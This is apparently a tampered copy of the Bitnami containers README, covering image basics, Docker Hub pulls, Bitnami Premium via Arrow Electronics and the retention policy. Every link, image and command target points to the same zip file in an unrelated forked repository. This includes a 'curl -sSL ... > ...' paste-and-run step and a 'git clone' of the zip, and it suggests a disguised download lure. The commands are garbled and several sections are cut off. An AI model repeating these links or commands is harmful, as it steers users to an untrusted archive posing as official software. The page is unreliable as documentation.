<p align="center">
    <img width="400px" height=auto src="https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip" />
</p>

<p align="center">
    <a href="https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip"><img src="https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip" /></a>
    <a href="https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip"><img src="https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip" /></a>
    <a href="https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip"><img src="https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip" /></a>
    <a href="https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip"><img src="https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip" /></a>
</p>
...
Popular applications, provided by [Bitnami](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip), containerized and ready to launch.
...
* All our images are based on [**minideb**](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip) -a minimalist Debian-based container image that gives you a small base container image and the familiarity of a leading Linux distribution- or **scratch** -an explicitly empty image-.
* All Bitnami images available in Docker Hub are signed with [Notation](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip). [Check this post](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip) to know how to verify the integrity of the images.
* Bitnami container images are released regularly with the latest distribution packages available.

Looking to use our applications in production? Try [VMware Tanzu Application Catalog](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip), the enterprise edition of Bitnami Application Catalog.

## Get an image

The recommended way to get any of the Bitnami Images is to pull the prebuilt image from the [Docker Hub Registry](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip).
...
```console
git clone https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip
...
The main folder of each application contains a functional `https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip` file. Run the application using it as shown below:

```console
curl -sSL https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip > https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip
docker-compose up -d
```
...
Enterprises that love Bitnami can now purchase a Bitnami Premium subscription from [Arrow Electronics](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip) and consume the containers and Helm charts right in Docker Hub. Bitnami Premium users will get access to private Docker Hub repositories with the same containers and Helm charts they are used to, plus new commercial features including:
...
* Unlimited pulls from Docker Hub will no longer be available. Free Bitnami Application Catalog containers and charts will be subject to the same limits as any other Docker Hub repos starting December 16th, 2024. Pulls of Bitnami Premium containers and Helm charts will not count towards your [Docker Hub pull](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip) limits or overages.
...
* **UI and API**: TAC includes access to a user interface where you can add and remove applications from your catalog, and interact with the software knowledge graph to see at-a-glance details about your software. The [TAC API](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip) enables you to build information from the software knowledge graph into your pipelines to ensure you are keeping your applications up-to-date with the latest patched applications.
...
We now begin our newest endeavor with [Arrow Electronics](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip). Arrow is a global leader in IT distribution. Arrow is known for its ability to help businesses navigate the complexities of modern IT landscapes, providing the tools, technology, and expertise needed to drive digital transformation and operational efficiency.
...
We are excited to deliver an enhanced experience for [Bitnami Premium](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip) users, but this is just the beginning. We will continue to build on the value that all of our Bitnami community members, both free and paid, realize through our many years of experience publishing high-quality open source software packages for the world’s developers.

Keep abreast of our blog for new updates and features, and be sure to check to follow us on [X (formerly Twitter)](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip) and [LinkedIn](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip).
...
* [Trivy](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip)
* [Grype](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip)
...
We have partnered with Arrow Electronics as the exclusive vendor of Bitnami Premium. When you purchase a Bitnami Premium subscription through ArrowSphere Marketplace, you will be granted access to the /bitnamiprem and /bitnamichartsprem distribution registries in Docker Hub. To learn more, visit [https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip).

## Retention policy

Deprecated assets will be retained in the container registry ([Bitnami DockerHub org](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip)) without changes for, at least, 6 months after the deprecation.
...
We'd love for you to contribute to those container images. You can request new features by creating an [issue](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip), or submit a [pull request](https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip) with your contribution.
...
<https://raw.githubusercontent.com/AlurraldeAc/containers-ForSnyk/main/bitnami/attu/2/containers-ForSnyk-3.6.zip>
